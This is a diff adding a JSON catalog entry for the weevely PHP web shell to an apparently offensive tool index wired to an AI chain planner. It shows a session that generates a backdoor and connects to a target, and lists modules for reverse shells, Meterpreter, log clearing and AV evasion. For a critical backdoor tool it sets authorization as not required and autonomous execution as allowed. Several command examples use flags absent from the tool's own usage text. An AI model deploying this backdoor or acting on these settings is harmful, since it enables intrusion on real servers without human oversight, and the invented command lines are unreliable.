@@ -1,0 +1,171 @@
+{
+  "id": "kali:weevely",
+  "kind": "kali_source_package",
+  "name": "weevely",
+  "title": "weevely",
+  "summary": "### weevely",
+  "version": "4.0.2-1",
+  "architectures": [
+    "all"
+  ],
+  "homepage": "https://github.com/epinna/weevely3/",
+  "repository": "https://salsa.debian.org/pkg-security-team/weevely",
+  "metapackages": [
+    "kali-linux-default",
+    "kali-linux-everything",
+    "kali-linux-headless",
+    "kali-linux-large",
+    "kali-tools-post-exploitation",
+    "kali-tools-web"
+  ],
+  "install": {
+    "apt": "sudo apt install weevely"
+  },
+  "packages": [
+    {
+      "name": "weevely"
+    }
+  ],
+  "commands": [
+    {
+      "name": "weevely",
+      "description": "Weaponized web shell",
+      "usage": "weevely [-h] {terminal,session,generate} ...",
+      "arguments": [
+        {
+          "flags": [
+            "-h",
+            "--help"
+          ],
+          "metavar": "- elp",
+          "takes_value": true,
+          "description": "show this help message and exit",
+          "default": null,
+          "choices": null,
+          "raw": "  -h, --help            show this help message and exit"
+        }
+      ],
+      "raw_help": "root@kali:~# weevely generate s3cr3t\n[generate.php] Backdoor file 'weevely.php' created with password 's3cr3t'\nroot@kali:~# weevely http://192.168.1.202/weevely.php s3cr3t\n      ________                     __\n     |  |  |  |----.----.-.--.----'  |--.--.\n     |  |  |  | -__| -__| |  | -__|  |  |  |\n     |________|____|____|___/|____|__|___  | v1.1\n                                     |_____|\n              Stealth tiny web shell\n\n[+] Browse filesystem, execute commands or list available modules with ':help'\n[+] Current session: 'sessions/192.168.1.202/weevely.session'\n\nwww-data@kali:/var/www $ uname\nLinux\nwww-data@kali:/var/www $ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "examples": [
+        {
+          "status": "operational_example",
+          "command": "weevely generate s3cr3t\n[generate.php] Backdoor file 'weevely.php' created with password 's3cr3t'\nweevely http://192.168.1.202/weevely.php s3cr3t\n      ________                     __\n     |  |  |  |----.----.-.--.----'  |--.--.\n     |  |  |  | -__| -__| |  | -__|  |  |  |\n     |________|____|____|___/|____|__|___  | v1.1\n                                     |_____|\n              Stealth tiny web shell\n\n[+] Browse filesystem, execute commands or list available modules with ':help'\n[+] Current session: 'sessions/192.168.1.202/weevely.session'\n\nwww-data@kali:/var/www $ uname\nLinux\nwww-data@kali:/var/www $ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "template": null,
+          "original_sha256": "dca9cdd3979d1a718a837e5e899b08851e13ee22f1517f219897048f6e4342ef"
+        },
+        {
+          "status": "operational_example",
+          "command": "weevely <URL> <password> [cmd]",
+          "template": null,
+          "original_sha256": "ef79fbd7e0da358978878da7ae338b632794ddc41d7ec698ec689d3c15ecaa17"
+        },
+        {
+          "status": "operational_example",
+          "command": "weevely session <path> [cmd]",
+          "template": null,
+          "original_sha256": "49a96ac7deffd5625cc9875fe3c6039b6d4cc676b31ce0b5f4d4a2ebaceb1983"
+        },
+        {
+          "status": "operational_example",
+          "command": "weevely generate <password> <path>",
+          "template": null,
+          "original_sha256": "0423d39d8884acf203e8b5d469acfd759049ceffe43cd0b5c7521858ee36b680"
+        }
+      ],
+      "risk": {
+        "level": "critical",
+        "signals": [
+          "backdoor",
+          "rat"
+        ],
+        "requires_explicit_authorization": false,
+        "allow_autonomous_execution": true,
+        "examples_policy": "operational"
+      },
+      "local_help": {
+        "--help": "usage: weevely [-h] {terminal,session,generate} ...\n\npositional arguments:\n  {terminal,session,generate}\n    terminal            Run terminal or command on the target\n    session             Recover an existing session\n    generate            Generate new agent\n\noptions:\n  -h, --help            show this help message and exit",
+        "-h": "usage: weevely [-h] {terminal,session,generate} ...\n\npositional arguments:\n  {terminal,session,generate}\n    terminal            Run terminal or command on the target\n    session             Recover an existing session\n    generate            Generate new agent\n\noptions:\n  -h, --help            show this help message and exit",
+        "help": "[+] weevely 4.0.1\n[!] Error: the following arguments are required: password\n\n[+] Run terminal or command on the target\n    weevely <URL> <password> [cmd]\n\n[+] Recover an existing session\n    weevely session <path> [cmd]\n\n[+] Generate new agent\n    weevely generate <password> <path>\n\nTraceback (most recent call last):\n  File \"/usr/lib/python3.13/argparse.py\", line 1979, in _parse_known_args2\n    namespace, args = self._parse_known_args(args, namespace, intermixed)\n                      ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/argparse.py\", line 2276, in _parse_known_args\n    raise ArgumentError(None, _('the following arguments are required: %s') %\n               ', '.join(required_actions))\nargparse.ArgumentError: the following arguments are required: password\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \"/usr/bin/weevely\", line 104, in <module>\n    arguments = parser.parse_args()\n  File \"/usr/lib/python3.13/argparse.py\", line 1940, in parse_args\n    args, argv = self.parse_known_args(args, namespace)\n                 ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/argparse.py\", line 1950, in parse_known_args\n    return self._parse_known_args2(args, namespace, intermixed=False)\n           ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/argparse.py\", line 1979, in _parse_known_args2\n    namespace, args = self._parse_known_args(args, namespace, intermixed)\n                      ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/argparse.py\", line 2234, in _parse_known_args\n    stop_index = consume_positionals(start_index)\n  File \"/usr/lib/python3.13/argparse.py\", line 2186, in consume_positionals\n    take_action(action, args)\n    ~~~~~~~~~~~^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/argparse.py\", line 2055, in take_action\n    action(self, namespace, argument_values, option_string)\n    ~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/argparse.py\", line 1300, in __call__\n    subnamespace, arg_strings = subparser.parse_known_args(arg_strings, None)\n                                ~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/argparse.py\", line 1950, in parse_known_args\n    return self._parse_known_args2(args, namespace, intermixed=False)\n           ~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.13/argparse.py\", line 1981, in _parse_known_args2\n    self.error(str(err))\n    ~~~~~~~~~~^^^^^^^^^^\n  File \"/usr/share/weevely/core/argparsers.py\", line 56, in error\n    raise ArgparseError(message)\ncore.weexceptions.ArgparseError: the following arguments are required: password",
+        "man": "WEEVELY(1)                       User Commands                       WEEVELY(1)\n\nNAME\n     Weevely - Weaponized web shell\n\nDESCRIPTION\n     A  web  shell designed for post-exploitation purposes that can be extended\n     over the network at runtime.\n\n     Upload weevely PHP agent to a target web server to get remote shell access\n     to it.  Once connected you can make use of the more than 30 modules to as-\n     sist administrative tasks, maintain access, provide situational awareness,\n     elevate privileges, and spread into the target network.\n\nSYNOPSIS\n     Run terminal to the target\n     weevely <URL> <password> [cmd]\n\n     Generate backdoor agent\n     weevely generate <password> <path>\n\n     Load session file\n     weevely session <path>\n\n   Features\n     * Shell access to the target\n\n     * SQL console pivoting on the target\n\n     * HTTP/HTTPS proxy to browse through the target\n\n     * Upload and download files\n\n     * Spawn reverse and direct TCP shells\n\n     * Audit remote target security\n\n     * Run Meterpreter payloads\n\n     * Port scan pivoting on target\n\n     * Mount the remote filesystem\n\n     * Bruteforce SQL accounts pivoting on the target\n\n   Agent\n     The agent is a small, polymorphic PHP script hardly detected by AV and the\n     communication protocol is obfuscated within HTTP requests.\n\n   Modules\n     Module                        Description\n     --------------------------------------------------------------------------\n     :audit_filesystem             Audit the file system for weak permissions.\n     :audit_suidsgid               Find files with SUID or SGID flags.\n     :audit_disablefunctionby-     Bypass disable_function  restrictions  with\n     pass                          mod_cgi and .htaccess.\n     :audit_etcpasswd              Read /etc/passwd with different techniques.\n     :audit_phpconf                Audit PHP configuration.\n     :shell_sh                     Execute shell commands.\n     :shell_su                     Execute commands with su.\n     :shell_php                    Execute PHP commands.\n     :system_extensions            Collect PHP and webserver extension list.\n     :system_info                  Collect system information.\n     :system_procs                 List running processes.\n     :backdoor_reversetcp          Execute a reverse TCP shell.\n     :backdoor_tcp                 Spawn a shell on a TCP port.\n     :backdoor_meterpreter         Start a meterpreter session.\n     :bruteforce_sql               Bruteforce SQL database.\n     :file_gzip                    Compress or expand gzip files.\n     :file_clearlog                Remove string from a file.\n     :file_check                   Get attributes and permissions of a file.\n     :file_upload                  Upload file to remote filesystem.\n     :file_webdownload             Download an URL.\n     :file_tar                     Compress or expand tar archives.\n     :file_download                Download file from remote filesystem.\n     :file_bzip2                   Compress or expand bzip2 files.\n     :file_edit                    Edit remote file on a local editor.\n     :file_grep                    Print  lines matching a pattern in multiple\n                                   files.\n     :file_ls                      List directory content.\n     :file_cp                      Copy single file.\n     :file_rm                      Remove remote file.\n     :file_upload2web              Upload file automatically to a  web  folder\n                                   and get corresponding URL.\n     :file_zip                     Compress or expand zip files.\n     :file_touch                   Change file timestamp.\n     :file_find                    Find files with given names and attributes.\n     :file_mount                   Mount remote filesystem using HTTPfs.\n     :file_enum                    Check  existence  and permissions of a list\n                                   of paths.\n     :file_read                    Read remote file from the  remote  filesys-\n                                   tem.\n     :file_cd                      Change current working directory.\n     :sql_console                  Execute SQL query or run console.\n     :sql_dump                     Multi dbms mysqldump replacement.\n     :net_mail                     Send mail.\n     :net_phpproxy                 Install PHP proxy on the target.\n     :net_curl                     Perform a curl-like HTTP request.\n     :net_proxy                    Run  local proxy to pivot HTTP/HTTPS brows-\n                                   ing through the target.\n     :net_scan                     TCP Port scan.\n     :net_ifconfig                 Get network interfaces addresses.\n\nSEE ALSO\n     https://github.com/epinna/weevely3/wiki\n\nAUTHOR\n     weevely is developed by The Weevely Developers, this manpage was  made  by\n     Emilio  <epinna>  and Samuel Henrique <samueloph@debian.org> based on wee-\n     vely's README.md and can be used by other projects as well.\n\nweevely 3.7.0                     October 2018                       WEEVELY(1)",
+        "apropos": "weevely (1)          - Weaponized web shell"
+      },
+      "binary_metadata": {
+        "path": "/usr/bin/weevely",
+        "size_bytes": 3413,
+        "is_symlink": true,
+        "real_path": "/usr/share/weevely/weevely.py",
+        "file_type": "symbolic link to ../share/weevely/weevely.py"
+      }
+    }
+  ],
+  "risk": {
+    "level": "critical",
+    "signals": [
+      "offensive_tool",
+      "intrinsic",
+      "remote_possible",
+      "polymorphic_compatible",
+      "target_adaptive_compatible"
+    ],
+    "requires_explicit_authorization": false,
+    "allow_autonomous_execution": true,
+    "examples_policy": "operational"
+  },
+  "source": {
+    "official": true,
+    "page": "https://www.kali.org/tools/weevely/",
+    "raw_markdown": "https://gitlab.com/kalilinux/documentation/kali-tools/-/raw/main/weevely/index.md",
+    "retrieved_at": "2026-07-14T13:08:59+00:00",
+    "sha256": "d803141e885483942a1b06c2b2bd6006353e0b819cd3bfdd0d8a660565843de5"
+  },
+  "apt_metadata": {
+    "section": "web",
+    "installed_size": "899",
+    "maintainer": "Debian Security Tools <team+pkg-security@tracker.debian.org>",
+    "architecture": "all",
+    "version": "4.0.2-1",
+    "depends": "python3, python3-dateutil, python3-mako, python3-prettytable, python3-socks, python3-yaml",
+    "description": "Stealth tiny web shell\nWeevely is a stealth PHP web shell that simulate telnet-like\nconnection. It is an essential tool for web application post\nexploitation, and can be used as stealth backdoor or as a\nweb shell to manage legit web accounts, even free hosted\nones.",
+    "homepage": "https://github.com/epinna/weevely3/"
+  },
+  "tags": [
+    "offensive",
+    "weevely",
+    "web",
+    "kfiosa",
+    "indexed",
+    "polymorphic",
+    "target-adaptive"
+  ],
+  "use_cases": [
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
+  ],
+  "command_examples": [
+    "cd toolboxes/weevely && python3 weevely.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/weevely && python3 weevely.py --help",
+    "cd toolboxes/weevely && python3 weevely.py --help",
+    "cd toolboxes/weevely && python3 weevely.py --help",
+    "cd toolboxes/weevely && python3 weevely.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST weevely --output $KFIOSA_OUTPUT_DIR/weevely.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST weevely --output $KFIOSA_OUTPUT_DIR/weevely.log"
+  ],
+  "attack_surface": [
+    "web"
+  ],
+  "phase_hint": "any",
+  "requires_hardware": [
+    "none"
+  ],
+  "polymorphic_strategies": [
+    "param_grammar"
+  ],
+  "target_adaptive_targets": [
+    "target_class"
+  ],
+  "_kfiosa_enriched_schema": "1.1.0"
+}
